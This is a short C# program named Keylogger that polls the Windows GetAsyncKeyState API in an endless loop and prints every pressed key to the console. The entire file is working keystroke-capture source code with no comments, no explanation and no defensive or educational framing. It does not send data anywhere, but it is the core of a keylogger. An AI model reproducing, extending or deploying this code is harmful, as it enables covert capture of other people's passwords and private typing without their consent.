using System;
using System.Threading;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Keylogger
{
    class Program
    {
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(int i);
        
        static void Main(string[] args)
        {
            while (true)
            {
                for (int i = 0; i < 255; i++)
                {
                    if (GetAsyncKeyState(i) == 32769)
                    {
                        Console.Write((Keys)i);
                    }
                }
                
                Thread.Sleep(10);
            }
        }
    }
}
